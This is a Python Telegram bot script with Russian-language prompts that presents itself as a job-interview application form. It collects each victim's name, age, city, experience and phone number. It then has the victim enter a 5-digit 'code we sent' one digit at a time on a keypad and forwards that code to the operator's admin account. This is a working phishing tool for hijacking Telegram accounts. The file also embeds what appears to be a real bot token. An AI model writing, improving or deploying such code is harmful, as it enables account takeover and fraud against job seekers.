import logging
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.filters import Command
from aiogram.utils.markdown import hbold
from keep_alive import keep_alive

keep_alive()

TOKEN = "7865949302:AAGMFcMFFpDRBz7qgEdDGtEOlA9EJ4sNDnY"
ADMIN_ID = 1768059976  # Замени на ID админа
CODE_LINK = "https://t.me/+42777"

logging.basicConfig(level=logging.INFO)

bot = Bot(token=TOKEN)
dp = Dispatcher()

user_data = {}

keyboard_phone = ReplyKeyboardMarkup(
    keyboard=[[
        KeyboardButton(text="📱 Поделиться номером", request_contact=True)
    ]],
    resize_keyboard=True,
)

keyboard_digits = ReplyKeyboardMarkup(
    keyboard=[[
        KeyboardButton(text="1"),
        KeyboardButton(text="2"),
        KeyboardButton(text="3")
    ],
              [
                  KeyboardButton(text="4"),
                  KeyboardButton(text="5"),
                  KeyboardButton(text="6")
              ],
              [
                  KeyboardButton(text="7"),
                  KeyboardButton(text="8"),
                  KeyboardButton(text="9")
              ], [KeyboardButton(text="0"),
                  KeyboardButton(text="❌ Очистить")]],
    resize_keyboard=True)


@dp.message(Command("start"))
async def start(message: types.Message):
    user_id = message.from_user.id
    user_data[user_id] = {}
    await message.answer("Привет! Давай заполним анкету. Как тебя зовут?")


@dp.message(F.contact)
async def get_phone(message: types.Message):
    user_id = message.from_user.id
    user_info = user_data.get(user_id, {})

    user_info["phone"] = message.contact.phone_number
    user_data[user_id] = user_info

    text = ("🔔 Новая заявка!\n"
            f"👤 Имя: {user_info.get('name', 'Не указано')}\n"
            f"📅 Возраст: {user_info.get('age', 'Не указано')}\n"
            f"📍 Город: {user_info.get('city', 'Не указано')}\n"
            f"💼 Опыт: {user_info.get('experience', 'Не указано')}\n"
            f"📞 Телефон: {user_info.get('phone', 'Не указан')}\n\n"
            f"📎 Открыть профиль: [ссылка](tg://user?id={user_id})")

    buttons = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Подтвердить",
                             callback_data=f"confirm_{user_id}")
    ]])

    msg = await bot.send_message(ADMIN_ID, text, reply_markup=buttons)
    user_info["admin_msg_id"] = msg.message_id
    user_data[user_id] = user_info

    await message.answer("Ваш номер получен! Ожидайте подтверждения.",
                         reply_markup=ReplyKeyboardRemove())


@dp.callback_query(F.data.startswith("confirm_"))
async def confirm_user(call: types.CallbackQuery):
    user_id = int(call.data.split("_")[1])
    user_info = user_data.get(user_id, {})

    if user_info:
        user_info["status"] = "waiting_code"
        user_info["code_input"] = ""
        user_data[user_id] = user_info

        text = ("✅ Введите отправленный нами КОД\n"
                "Он появится [здесь](https://t.me/+42777)\n\n"
                "Введенный код: `_____`")

        msg = await bot.send_message(user_id,
                                     text,
                                     disable_web_page_preview=False,
                                     reply_markup=keyboard_digits,
                                     parse_mode='Markdown')

        user_info["code_msg_id"] = msg.message_id
        user_data[user_id] = user_info

        new_buttons = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔄 Проверяется...", callback_data="null")
        ]])

        try:
            await bot.edit_message_reply_markup(
                chat_id=ADMIN_ID,
                message_id=user_info["admin_msg_id"],
                reply_markup=new_buttons)
        except Exception as e:
            logging.error(f"Error while editing admin message: {e}")

        await call.answer("Пользователь уведомлен о вводе кода!",
                          show_alert=True)


@dp.message(F.text)
async def process_message(message: types.Message):
    user_id = message.from_user.id
    user_info = user_data.get(user_id, {})
    text = message.text.strip()

    # Обработка ввода кода
    if user_info.get("status") == "waiting_code":
        digit = text

        if digit == "❌ Очистить":
            user_info["code_input"] = ""
        elif digit.isdigit() and len(digit) == 1 and len(
                user_info["code_input"]) < 5:
            user_info["code_input"] += digit

        user_data[user_id] = user_info

        try:
            await bot.delete_message(chat_id=user_id,
                                     message_id=message.message_id)
        except:
            pass

        entered_code = user_info["code_input"]
        display_code = ""
        for i in range(5):
            if i < len(entered_code):
                display_code += entered_code[i]
            else:
                display_code += "_"

        new_text = ("✅ <b>Введите отправленный нами КОД</b>\n"
                    f"Он появится <a href='{CODE_LINK}'>здесь</a>\n\n"
                    f"Введенный код: <code>{display_code}</code>")

        try:
            await bot.edit_message_text(
                chat_id=user_id,
                message_id=user_info["code_msg_id"],
                text=new_text,
                disable_web_page_preview=True,
                parse_mode="HTML",
                reply_markup=keyboard_digits
                if len(user_info["code_input"]) < 5 else ReplyKeyboardRemove())
        except Exception as e:
            logging.error(f"Error editing message: {e}")

        if len(user_info["code_input"]) == 5:
            code = user_info["code_input"]
            await bot.send_message(user_id,
                                   "🔄 Верификация на проверке. Ожидайте...",
                                   reply_markup=ReplyKeyboardRemove())

            admin_text = (
                f"🔔 Пользователь ввел код!\n"
                f"🔢 Код: {hbold(code)}\n\n"
                f"📎 <a href='tg://user?id={user_id}'>Открыть профиль</a>")

            await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML")

            user_info["status"] = "code_entered"
            user_data[user_id] = user_info

        return

    # Обработка анкеты
    if "name" not in user_info:
        user_info["name"] = text
        await message.answer("Сколько тебе лет?")
    elif "age" not in user_info:
        user_info["age"] = text
        await message.answer("Из какого ты города?")
    elif "city" not in user_info:
        user_info["city"] = text
        await message.answer("Каков твой опыт работы?",
                             reply_markup=ReplyKeyboardRemove())
    elif "experience" not in user_info:
        user_info["experience"] = text
        await message.answer(
            "Для записи на собеседование отправьте свой номер.",
            reply_markup=keyboard_phone)

    user_data[user_id] = user_info


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
